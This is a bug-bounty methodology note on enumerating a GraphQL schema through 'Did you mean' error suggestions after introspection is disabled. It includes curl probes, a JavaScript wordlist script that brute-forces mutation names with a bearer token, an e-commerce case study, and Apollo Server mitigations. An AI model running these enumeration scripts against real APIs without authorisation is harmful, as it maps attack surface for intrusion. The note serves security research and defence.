---
type: pattern
title: "Pattern - GraphQL Field Suggestion Enumeration"
tags: [pattern, cwe-200, graphql, schema-enumeration, info-disclosure, bb-pattern]
status: verified
vuln_class: info-leak
severity_range: P3-P5
seen_in: [graphql-api, apollo-server]
prerequisites: []
last_updated: 2026-04-11
---

# Pattern - GraphQL Field Suggestion Enumeration

> **TL;DR**: Disabling GraphQL introspection does not hide the schema. Most GraphQL validators emit "Did you mean X?" suggestions on unknown-field errors, and these suggestions leak real field names, type names, and required-input structure one query at a time — enough to reconstruct a full working schema map without introspection ever being enabled.

## Root Cause

GraphQL validators produce a "did you mean" suggestion when a query references an unknown field, to help developers debug typos. Even with introspection disabled, this convenience feature still discloses valid field and type names:

```bash
# Introspection disabled
curl -d '{"query":"{ __schema { types { name } } }"}'
# -> "GraphQL introspection is not allowed"

# But field suggestions still leak
curl -d '{"query":"{ customer { id } }"}'
# -> 'Cannot query field "customer" on type "Query". Did you mean "guestOrder" or "store"?'
```

## Enumeration Methodology

### Step 1: Discover Query root fields

```bash
# A deliberately invalid field name triggers a "did you mean X" suggestion
curl -d '{"query":"{ xxInvalid }"}'

curl -d '{"query":"{ customer { id } }"}'
curl -d '{"query":"{ user { id } }"}'
curl -d '{"query":"{ me { id } }"}'
curl -d '{"query":"{ viewer { id } }"}'
# Each attempt triggers a "did you mean X" hint — record every suggestion returned
```

### Step 2: Enumerate the type behind each discovered field

```bash
# Once a field like guestOrder is confirmed to return an OIS_Order-shaped type:
curl -d '{"query":"{ guestOrder(input: ...) { xxInvalid } }"}'
# -> 'Cannot query field "xxInvalid" on type "OIS_Order".'

# Recurse into nested types the same way
curl -d '{"query":"{ guestOrder(...) { billingAddress { xxInvalid } } }"}'
# -> 'Cannot query field "xxInvalid" on type "OIS_Address".'
```

### Step 3: Enumerate the Mutation root (dictionary attack — suggestions often don't fire here)

Mutation roots typically have too many fields for the "did you mean" feature to trigger reliably, so fall back to a curated wordlist:

```js
var mutations = [
  // Order lifecycle
  'createOrder', 'placeOrder', 'cancelOrder', 'updateOrder', 'returnOrder', 'refundOrder',
  // Customer
  'createCustomer', 'updateCustomer', 'updateCustomerProfile', 'updateCustomerPassword',
  'updateCustomerAddress', 'createCustomerAddress', 'deleteCustomerAddress',
  // Cart / basket
  'createCart', 'updateCart', 'addToCart', 'removeFromCart', 'createBasket', 'updateBasket', 'deleteBasket',
  // Payment
  'createPayment', 'capturePayment', 'refundPayment', 'authorizePayment',
  // ...
];

Promise.all(mutations.map(m =>
  fetch('/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ query: 'mutation { ' + m + ' { xxX } }' })
  }).then(r => r.json()).then(j => {
    var msg = j.errors?.[0]?.message || '';
    // The field exists if the error is scoped to the payload type,
    // not to the Mutation root type itself.
    return { mut: m, exists: !msg.includes('on type "Mutation"') };
  })
));
```

### Step 4: Discover required input fields

```bash
# An empty input object triggers "missing required field" errors
curl -d '{"query":"mutation { updateCustomerAddress(input: {}) { xxX } }"}'
# -> 'Field "UpdateCustomerAddressInput.id" of required type "ID!" was not provided.'
# -> 'Field "UpdateCustomerAddressInput.address" of required type "AddressInput!" was not provided.'
```

### Step 5: Enumerate enum values

```bash
curl -d '{"query":"mutation { cancelOrder(input: {orderNumber: \"1\", cancelReason: XXINVALID}) { xxX } }"}'
# -> 'Value "XXINVALID" does not exist in "CancelReason" enum.'
# Then probe common values: OTHER, CUSTOMER_REQUEST, CHANGED_MIND, DEFECT
```

## Case Study

On an e-commerce storefront's `/graphql` endpoint, starting from 7 initial query-field suggestions, this technique fully reconstructed:

- **10 Query root fields** (`guestOrder`, `orders`, `store`, `nodes`, `viewer`, ...)
- **7 Mutation root fields** (`cancelOrder`, `updateCustomerAddress`, `updateBasket`, ...)
- **15+ types** (`OIS_Order`, `OIS_Address`, `RegisteredCustomer`, `CustomerAddress`, `Birthday`, `Loyalty`, `PaymentInstrument`, ...)
- Required fields for every discovered input type

Outcome: from "schema is hidden" to a complete reconstructed schema, which in turn exposed 7 IDOR primitives on the mutation surface — filed as a P2 report using the schema map as supporting evidence.

## Why It Matters

Developers frequently assume that disabling introspection is sufficient to hide a GraphQL schema. In practice:

- Modern Apollo Server deployments ship with field suggestions enabled by default.
- An attacker needs only a few dozen queries to reconstruct most of a working schema.
- The reconstructed schema itself frequently reveals internal-only mutations, undocumented admin endpoints, and backup/legacy APIs that were never meant to be discoverable.

## Bypass Techniques (defender's perspective — what actually closes this)

**Apollo Server 4+:**

```ts
new ApolloServer({
  hideSchemaDetailsFromClientErrors: true,  // disables "Did you mean X" suggestions
  includeStacktraceInErrorResponses: false, // disables stack traces in error responses
})
```

**All GraphQL implementations:**

- Disable all debug output in production.
- Use a persisted-query allow-list — only accept pre-registered operations.
- Normalize error messages to a generic "Bad request" instead of field-specific detail.

## Impact Assessment

- **Standalone**: P4-P5 informational — most large programs will mark schema disclosure alone as N/A.
- **Chained**: P2-P3 as supporting evidence when it demonstrates the debug posture that enabled a follow-on IDOR/auth-bypass finding.
- **Best practice**: fold this into the appendix of the primary IDOR/auth-bypass report rather than filing it separately.

## Stop-Loss

If a target's Mutation root never triggers suggestions and the dictionary attack (Step 3) returns nothing beyond a handful of already-known operations, stop enumerating and move to the next attack surface — treat what you found as sufficient schema context rather than chasing full coverage.

## References

- [[Pattern - IDOR]]
- [[Pattern - GraphQL]]
